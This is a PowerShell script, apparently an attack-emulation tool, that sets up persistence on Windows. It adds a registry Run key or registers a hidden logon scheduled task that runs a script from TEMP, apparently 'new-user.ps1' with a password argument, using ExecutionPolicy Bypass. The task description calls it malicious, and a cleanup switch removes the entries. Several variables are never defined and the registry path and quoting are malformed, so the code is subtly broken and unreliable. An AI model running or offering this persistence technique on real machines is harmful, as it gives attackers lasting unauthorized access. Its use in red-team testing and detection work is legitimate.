param(
    [string][ValidateSet("HKLM", "HKCU", "Scheduler")]$Mode = "HKLM",
    [switch]$Cleanup
)

$Name = "AccountPersistence"
if($Cleanup) {
    if(($Mode -eq "HKLM") -or ($Mode -eq "HKCU")) {
        $RegistryPath = "$Mode\:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        if (Test-Path -Path $RegistryPath) {
            Remove-ItemProperty -Path $RegistryPath -Name $Name -ErrorAction SilentlyContinue
        }
    }
    elseif ($Mode -eq "Scheduler") {
        $TaskName = "Persistence-ScheduledTask"
        if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
            Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
        }
    }
}
else {
    if(($Mode -eq "HKLM") -or ($Mode -eq "HKCU")) {
        $RegistryPath = "$Mode\:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        $command = "powershell.exe -ExecutionPolicy Bypass -File ""$script"" -password $Password -TaskName $taskName"
        New-ItemProperty -Path $registryPath -Name $Name -Value $command -PropertyType String
    }
    elseif ($Mode -eq "Scheduler") {
        $TaskName = "Persistence-ScheduledTask"
        $ScriptPath = "$env:TEMP\new-user.ps1"

        # Create an action to run the PowerShell script
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$ScriptPath"")"

        # Create a trigger to run the task at logon
        $Trigger = New-ScheduledTaskTrigger -AtLogOn

        # Register the scheduled task
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Description "Runs a malicious PowerShell script at logon"
    }
    else {
        Write-Error "The Mode isn't valid."
    }
}
